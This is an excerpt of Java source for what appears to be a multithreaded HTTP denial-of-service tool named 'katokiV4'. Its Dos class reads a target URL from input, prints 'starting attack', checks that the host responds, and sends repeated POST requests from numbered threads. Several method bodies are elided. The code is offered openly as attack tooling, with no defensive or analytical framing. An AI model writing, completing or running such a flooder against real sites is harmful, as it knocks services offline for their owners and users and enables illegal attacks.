...
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        url = in.nextLine();
        System.out.println("\n");
        System.out.println("Check Hosting: " + url);

        String[] SUrl = url.split("://");

        System.out.println("Welcome to katoki v4");
        ...
        System.out.println("katokiV4 by trangiahung");
        ...
        System.out.println("katokiV4 starting attack");
    ...
    private void sslCheckConnection(String url) throws Exception {
        ...
        int responseCode = con.getResponseCode();
        if (responseCode == 200) {
            System.out.println("KatokiV4 processing");
        }
        Dos.url = url;
    }
    ...
    private void postAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("katokiV4: " + responseCode + "Thread: " + this.seq);
    }
